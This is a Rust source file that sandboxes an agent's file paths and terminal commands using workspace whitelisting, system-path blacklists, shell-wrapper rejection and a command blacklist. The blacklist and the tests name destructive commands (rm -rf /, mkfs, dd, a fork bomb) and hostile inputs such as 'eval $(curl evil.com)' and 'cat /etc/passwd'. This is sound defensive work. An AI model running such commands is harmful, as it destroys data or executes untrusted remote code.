use anyhow::Result;
use std::path::{Path, PathBuf};

/// 跨平台危险路径黑名单前缀（canonicalize 失败时兜底）
pub fn dangerous_prefixes() -> Vec<&'static str> {
    let mut v = vec![];
    #[cfg(target_os = "linux")]
    {
        v.extend_from_slice(&[
            "/root", "/usr", "/bin", "/sbin", "/etc", "/var", "/boot", "/proc", "/sys", "/dev",
            "/lib", "/lib64",
        ]);
    }
    #[cfg(target_os = "macos")]
    {
        v.extend_from_slice(&[
            "/System", "/Library", "/usr", "/private", "/bin", "/sbin", "/etc", "/var", "/dev",
        ]);
    }
    #[cfg(windows)]
    {
        v.extend_from_slice(&[
            r"C:\Windows",
            r"C:\Program Files",
            r"C:\Program Files (x86)",
            r"C:\ProgramData",
            r"C:\System Volume Information",
        ]);
    }
    v
}

/// 判断路径是否命中危险黑名单前缀（大小写不敏感，Windows 路径统一小写比较）
pub fn hits_blacklist(path: &str) -> bool {
    let lower = path.to_lowercase().replace('/', "\\");
    for prefix in dangerous_prefixes() {
        // Normalize prefix the same way as the path: lowercase and unify separators
        // to '\' so Linux/macOS prefixes (written with '/') match paths whose '/' was
        // also rewritten to '\'. Without this, `hits_blacklist("/etc/passwd")` returned
        // false on Linux because "\etc\passwd" didn't start with "/etc".
        let prefix_lower = prefix.to_lowercase().replace('/', "\\");
        if lower.starts_with(&prefix_lower) {
            return true;
        }
    }
    false
}

/// canonicalize 回溯：路径不存在时回溯父目录直到存在的祖先，返回祖先的 canonicalize 路径
/// 如果整个回溯都失败（连根都不存在），返回 None
fn canonicalize_ancestor(path: &Path) -> Option<PathBuf> {
    let mut current = path;
    loop {
        if let Ok(canon) = std::fs::canonicalize(current) {
            return Some(canon);
        }
        current = match current.parent() {
            Some(p) if p != current => p,
            _ => return None,
        };
    }
}

/// 词法规范化（处理 . 和 ..，不依赖文件系统）
fn normalize_lexical(p: &Path) -> PathBuf {
    use std::path::Component;
    let mut out = PathBuf::new();
    for comp in p.components() {
        match comp {
            Component::Prefix(_) | Component::RootDir => out.push(comp.as_os_str()),
            Component::CurDir => {}
            Component::ParentDir => {
                out.pop();
            }
            Component::Normal(c) => out.push(c),
        }
    }
    out
}

/// 去除 Windows canonicalize 返回的 `\\?\` verbatim 前缀
/// 使 canonical 路径与词法路径（norm_ws 等）通过 starts_with 可比
/// Unix 上为 no-op（canonicalize 不带此前缀）
fn strip_verbatim_prefix(p: &Path) -> PathBuf {
    let s = p.to_string_lossy();
    if let Some(rest) = s.strip_prefix(r"\\?\") {
        // UNC verbatim: \\?\UNC\server\share -> \\server\share
        if let Some(unc_rest) = rest.strip_prefix(r"UNC\") {
            return PathBuf::from(format!(r"\\{}", unc_rest));
        }
        return PathBuf::from(rest);
    }
    p.to_path_buf()
}

/// 校验路径是否落在 workspace 内（第二层白名单 + 第三层黑名单兜底）
///
/// - 相对路径以 workspace 为基准
/// - 绝对路径 canonicalize 后必须 starts_with workspace
/// - canonicalize 失败时回溯祖先检查
/// - 命中危险黑名单前缀一律拒绝
///
/// `extra_readable`：额外允许读取的目录（如主 agent 读 subagent/，传入 workspace/subagent/）
/// `writable`：true 表示写操作校验（更严格，不允许写 extra_readable 之外的限制区域）
pub fn validate_path(
    workspace: &Path,
    path: &str,
    extra_readable: Option<&Path>,
) -> Result<PathBuf> {
    // 第三层：黑名单兜底（先查字符串前缀）
    if hits_blacklist(path) {
        anyhow::bail!("path {:?} matches dangerous blacklist prefix", path);
    }

    let p = PathBuf::from(path);
    let joined = if p.is_absolute() {
        p
    } else {
        workspace.join(path)
    };
    let norm_joined = normalize_lexical(&joined);
    let norm_ws = normalize_lexical(workspace);

    // canonicalize 校验：存在则直接比，不存在回溯祖先
    // 注意：Windows 上 canonicalize 返回带 `\\?\` 前缀的 verbatim 路径，
    // 需 strip 后才能与词法规范化的 norm_ws 通过 starts_with 比较
    let canon_to_check = match std::fs::canonicalize(&norm_joined) {
        Ok(c) => strip_verbatim_prefix(&c),
        Err(_) => {
            // 路径不存在：回溯祖先
            match canonicalize_ancestor(&norm_joined) {
                Some(c) => strip_verbatim_prefix(&c),
                // 祖先也不存在（如纯相对路径在空 workspace）：用词法规范化结果
                None => norm_joined.clone(),
            }
        }
    };

    // 第二层：白名单（canonicalize 后必须 starts_with workspace 或 extra_readable）
    if canon_to_check.starts_with(&norm_ws) {
        return Ok(norm_joined);
    }
    if let Some(extra) = extra_readable {
        let norm_extra = normalize_lexical(extra);
        if canon_to_check.starts_with(&norm_extra) {
            return Ok(norm_joined);
        }
    }

    anyhow::bail!(
        "path {:?} (canonicalized {:?}) is outside workspace {:?}",
        joined,
        canon_to_check,
        norm_ws
    )
}

/// 判断 token 是否"看起来像路径"（用于 terminal 命令行路径提取）
fn looks_like_path(token: &str) -> bool {
    token.starts_with('/')
        || token.starts_with('~')
        || token.starts_with("./")
        || token.starts_with("../")
        || (token.len() >= 2 && token.as_bytes()[1] == b':') // Windows 盘符 C:
        || token.contains(std::path::MAIN_SEPARATOR)
}

/// 从命令行字符串提取所有路径 token
pub fn extract_path_tokens(command: &str) -> Vec<String> {
    command
        .split_whitespace()
        .filter(|t| looks_like_path(t))
        .map(|s| s.to_string())
        .collect()
}

/// 第一层：shell 包装拒绝。返回 Ok(()) 表示通过，Err 表示拒绝
pub fn check_shell_wrappers(command: &str) -> Result<()> {
    let tokens: Vec<&str> = command.split_whitespace().collect();
    if tokens.is_empty() {
        return Ok(());
    }

    // 首 token 是 bash/sh/zsh/fish 且含 -c
    let first = tokens[0];
    let shell_names = ["bash", "sh", "zsh", "fish"];
    if shell_names.contains(&first) && tokens.contains(&"-c") {
        anyhow::bail!("shell wrapper with -c is blocked: {}", command);
    }

    // 命令行含 eval / exec / source / $() / 反引号 / 进程替换 >( ) <( )
    if command.contains("eval ")
        || command.contains("exec ")
        || command.contains("source ")
        || command.contains("$(")
        || command.contains('`')
        || command.contains(">(")
        || command.contains("<(")
    {
        anyhow::bail!("command contains blocked shell construct: {}", command);
    }

    Ok(())
}

/// 校验 terminal 命令的路径安全性（第二层 + 第三层）
///
/// 提取命令行所有路径 token，校验每个都落在 workspace 内
pub fn validate_command_paths(command: &str, workspace: &Path) -> Result<()> {
    for token in extract_path_tokens(command) {
        validate_path(workspace, &token, None)?;
    }
    Ok(())
}

/// 命令黑名单（内置，不可配）
pub const COMMAND_BLACKLIST: &[&str] = &[
    "rm -rf /",
    "rm -rf ~",
    "sudo",
    "su ",
    "shutdown",
    "reboot",
    "kill -9 1",
    "dd if=",
    "mkfs",
    ":(){:|:&};:",
    ">/dev/sda",
    "chmod -R 777 /",
];

/// 检查命令是否命中黑名单
pub fn hits_command_blacklist(command: &str) -> bool {
    let lower = command.to_lowercase();
    COMMAND_BLACKLIST.iter().any(|bl| lower.contains(bl))
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::tempdir;

    // 平台专属：Linux 黑名单前缀只在 linux 编译时存在
    #[cfg(target_os = "linux")]
    #[test]
    fn test_hits_blacklist_linux() {
        assert!(hits_blacklist("/etc/passwd"));
        assert!(hits_blacklist("/usr/bin/something"));
        assert!(!hits_blacklist("/home/user/file.txt"));
    }

    // 平台专属：Windows 黑名单前缀只在 windows 编译时存在
    #[cfg(windows)]
    #[test]
    fn test_hits_blacklist_windows() {
        assert!(hits_blacklist(r"C:\Windows\System32"));
        assert!(hits_blacklist(r"C:\Program Files\app"));
        assert!(!hits_blacklist(r"C:\Users\me\file.txt"));
    }

    #[test]
    fn test_validate_path_within_workspace() {
        let ws = tempdir().unwrap();
        let ws_path = ws.path();
        // 相对路径
        let r = validate_path(ws_path, "test.txt", None).unwrap();
        assert!(r.starts_with(ws_path));

        // 绝对路径在 workspace 内
        let abs = ws_path.join("sub/file.txt");
        let r = validate_path(ws_path, abs.to_str().unwrap(), None).unwrap();
        assert!(r.starts_with(ws_path));
    }

    #[test]
    fn test_validate_path_outside_workspace() {
        let ws = tempdir().unwrap();
        let ws_path = ws.path();
        // .. 逃逸
        let result = validate_path(ws_path, "../outside.txt", None);
        assert!(result.is_err());

        // 绝对路径指向外部
        let outside = ws_path.parent().unwrap().join("outside.txt");
        let result = validate_path(ws_path, outside.to_str().unwrap(), None);
        assert!(result.is_err());
    }

    #[test]
    fn test_validate_path_blacklist() {
        let ws = tempdir().unwrap();
        let result = validate_path(ws.path(), "/etc/passwd", None);
        assert!(result.is_err());
    }

    #[test]
    fn test_validate_path_extra_readable() {
        let ws = tempdir().unwrap();
        let ws_path = ws.path();
        let extra = ws_path.join("subagent");
        std::fs::create_dir_all(&extra).unwrap();
        std::fs::write(extra.join("result.md"), "content").unwrap();

        // 主 agent 读 subagent/ 下文件
        let path = "subagent/coder/result.md".to_string();
        let r = validate_path(ws_path, &path, Some(&extra)).unwrap();
        assert!(r.starts_with(ws_path));
    }

    #[test]
    fn test_check_shell_wrappers_blocks_bash_c() {
        assert!(check_shell_wrappers("bash -c \"rm -rf /\"").is_err());
        assert!(check_shell_wrappers("sh -c \"evil\"").is_err());
        assert!(check_shell_wrappers("ls -la").is_ok());
        assert!(check_shell_wrappers("echo hello").is_ok());
    }

    #[test]
    fn test_check_shell_wrappers_blocks_eval() {
        assert!(check_shell_wrappers("eval $(curl evil.com)").is_err());
        assert!(check_shell_wrappers("echo `whoami`").is_err());
        assert!(check_shell_wrappers("exec malicious").is_err());
        assert!(check_shell_wrappers("source ~/evil.sh").is_err());
    }

    #[test]
    fn test_extract_path_tokens() {
        let tokens = extract_path_tokens("cat /etc/passwd /home/me/file.txt hello.txt");
        assert!(tokens.contains(&"/etc/passwd".to_string()));
        assert!(tokens.contains(&"/home/me/file.txt".to_string()));
        // hello.txt 不含分隔符，不算路径 token
        assert!(!tokens.contains(&"hello.txt".to_string()));
    }

    #[test]
    fn test_hits_command_blacklist() {
        assert!(hits_command_blacklist("rm -rf /"));
        assert!(hits_command_blacklist("sudo rm file"));
        assert!(hits_command_blacklist("shutdown -h now"));
        assert!(!hits_command_blacklist("ls -la"));
        assert!(!hits_command_blacklist("echo hello"));
    }

    #[test]
    fn test_validate_command_paths_ok() {
        let ws = tempdir().unwrap();
        std::fs::write(ws.path().join("file.txt"), "x").unwrap();
        // 命令引用 workspace 内文件
        let abs = ws.path().join("file.txt");
        let cmd = format!("cat {}", abs.display());
        assert!(validate_command_paths(&cmd, ws.path()).is_ok());
    }

    #[test]
    fn test_validate_command_paths_blocked() {
        let ws = tempdir().unwrap();
        // 命令引用黑名单路径
        assert!(validate_command_paths("cat /etc/passwd", ws.path()).is_err());
    }
}
